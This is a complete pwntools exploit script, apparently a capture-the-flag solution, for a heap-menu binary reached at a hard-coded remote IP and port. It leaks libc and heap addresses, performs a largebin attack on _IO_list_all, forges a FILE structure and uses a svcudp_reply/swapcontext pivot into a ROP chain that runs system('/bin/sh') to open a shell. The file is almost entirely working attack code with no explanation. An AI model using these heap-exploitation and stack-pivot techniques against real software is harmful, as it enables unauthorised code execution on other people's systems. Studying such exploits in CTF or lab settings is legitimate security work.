from pwn import *
from ctypes import *
from struct import pack
banary = "./heap"
elf = ELF(banary)
#libc = ELF("./libc.so.6")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
ip = '60.204.244.127'
port = 666
local = 0
if local:
    io = process(banary)
else:
    io = remote(ip, port)

context(log_level = 'debug', os = 'linux', arch = 'amd64')
#context(log_level = 'debug', os = 'linux', arch = 'i386')

def dbg():
    gdb.attach(io)
    pause()

s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda : int(io.recv(10),16)
iuu64 = lambda : int(io.recv(6),16)
uheap = lambda : u64(io.recv(6).ljust(8,b'\x00'))
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(data)))
ia = lambda : io.interactive()

def cmd(choice):
    ru(">>")
    sl(str(choice))

def add(index,size):
    cmd(1)
    ru("idx? ")
    sl(str(index))
    ru("size? ")
    sl(str(size))

def delete(index):
    cmd(2)
    ru("idx? ")
    sl(str(index))

def show(index):
    cmd(3)
    ru("idx? ")
    sl(str(index))

def edit(index,content):
    cmd(4)  
    ru("idx? ")
    sl(str(index))
    ru("content : ")
    s(content)

add(0,0x420)
add(1,0x418)
add(2,0x418)

delete(0)
add(3,0x460)
delete(2)

show(0)
fd=uu64()
libcbase=fd-0x203f10
lg("fd")
lg("libcbase")

one=[0x50a47,0xebc81,0xebc85,0xebc88,0xebce2,0xebd3f,0xebd43]
onegadget=libcbase+one[1]
l_next=libcbase+0x3fe890
rtld_global=libcbase+0x3fd040
system=libcbase+libc.sym['system']
bin_sh=libcbase+next(libc.search(b'/bin/sh\x00'))
setcontext=libcbase+libc.sym['setcontext']+61
_IO_list_all = libcbase + libc.sym['_IO_list_all']
ret=libcbase+0x000000000002882f
pop_rdi=libcbase+0x000000000010f75b
leave_ret=libcbase+0x00000000000299d2
swapcontext=libcbase+0x000000000005814D
svcudp_reply=libcbase+0x000000000017923D
one=[0x583dc,0x583e3,0xef4ce,0xef52b]
one_gadget=libcbase+one[3]
open=libcbase+libc.sym['open']
read=libcbase+libc.sym['read']
write=libcbase+libc.sym['write']
pop_rsi=libcbase+0x0000000000110a4d
lg("l_next")
lg("rtld_global")

edit(0,b'A'*0x10)
show(0)
ru(b'A'*0x10)
heapbase=uheap()-0x290
lg("heapbase")
edit(0,p64(fd)*2+p64(heapbase+0x290)+p64(_IO_list_all-0x20))

add(4,0x490)

fake_heap=heapbase+0xf00+0x10
heap1=fake_heap+0x88
IO_wfile_jumps = libcbase + 0x202228#_IO_wfile_jumps

lg("fake_heap")
lg("heap1")
fake_file = b''
fake_file = p64(0)+p64(1)
fake_file=  fake_file.ljust(0x28,b'\x00')+p64(heap1)
fake_file = fake_file.ljust(0x68,b'\x00')+p64(fake_heap)
fake_file = fake_file.ljust(0x80,b'\x00')+p64(fake_heap)
fake_file = fake_file.ljust(0xb8,b'\x00')+p64(IO_wfile_jumps)
payload = cyclic(0x10)+fake_file
edit(2,payload)

payload = b''
payload = payload.ljust(0x58,b'\x00')+p64(svcudp_reply)
payload = payload.ljust(0xa0,b'\x00')+p64(fake_heap+0x120-0x28)+p64(ret)
payload = payload.ljust(0xc0,b'\x00')+p64(fake_heap)+p64(0)*3+p64(fake_heap-0x10)+p64(0)
payload +=b'\x00'*0x28+p64(fake_heap)
payload +=p64(swapcontext)
payload = payload.ljust(0x128,b'\x00')+p64(fake_heap+0x130)+p64(ret)*2+p64(pop_rdi)+p64(bin_sh)+p64(system)
payload = payload.ljust(0x168,b'\x00')+p64(fake_heap)
edit(3,payload)

cmd(5)

ia()
